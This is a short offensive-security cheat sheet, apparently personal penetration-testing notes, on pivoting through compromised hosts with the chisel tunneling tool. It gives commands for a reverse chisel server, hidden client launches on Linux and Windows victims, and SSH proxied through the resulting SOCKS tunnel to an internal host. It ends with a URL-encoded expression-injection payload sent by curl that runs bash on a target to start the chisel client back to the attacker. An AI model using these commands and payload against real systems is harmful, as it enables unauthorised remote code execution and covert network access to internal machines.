### Chisel

Client/server model
chisel server on kali, chisel client on victim

chisel server --port 8080 --reverse
```
On Client 

/tmp/chisel client 192.168.45.238:8080 R:socks > /dev/null 2>&1 &

On Server
chisel server --port 8080 --reverse

Windows client 
chisel.exe client 192.168.45.181:9090 R:socks


ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```

curl http://192.168.218.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.238:8080%20R:socks%27%29.start%28%29%22%29%7D/